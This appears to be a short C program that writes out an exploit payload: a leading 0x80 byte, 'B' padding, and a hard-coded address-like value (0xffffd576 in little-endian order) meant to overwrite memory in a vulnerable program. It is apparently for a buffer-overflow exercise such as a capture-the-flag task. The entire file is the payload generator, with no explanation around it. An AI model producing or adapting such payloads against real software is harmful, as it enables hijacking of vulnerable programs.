#include <stdio.h>
#include <unistd.h>

int main()
{
		printf("\x80");
		printf("BBBBBBBBBBBB");
		printf("\x76\xd5\xff\xff");
		printf("BBBBBBBBBBBBBBBBBBBBBB\n");
}
